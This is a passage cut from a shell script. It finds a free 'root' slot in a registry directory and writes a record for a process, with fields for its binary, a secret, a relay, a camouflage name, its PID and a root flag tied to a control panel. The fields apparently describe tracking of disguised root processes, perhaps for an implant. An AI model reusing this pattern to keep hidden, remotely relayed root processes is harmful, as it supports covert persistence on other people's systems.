    while [ $i -lt 100 ]; do [ -f "$REGD/root$i" ] || break; i=$((i+1)); done
    REGID=root$i
    if {
        echo "TYPE=root"
        echo "BIN=$exe"
        echo "SECRET=$sec"
        echo "RELAY=$RLY"
        echo "CAMO=$camo"
        echo "DIR=$(dirname "$exe" 2>/dev/null)"
        echo "RUNNER="
        echo "LOG="
        echo "PID=$p"
        echo "XROOT=1"
        echo "TIME=$(date "+%Y-%m-%d %H:%M:%S" 2>/dev/null)"
        echo "PANEL_HOME=$PANEL_HOME"
        echo "SRC=catatroot"
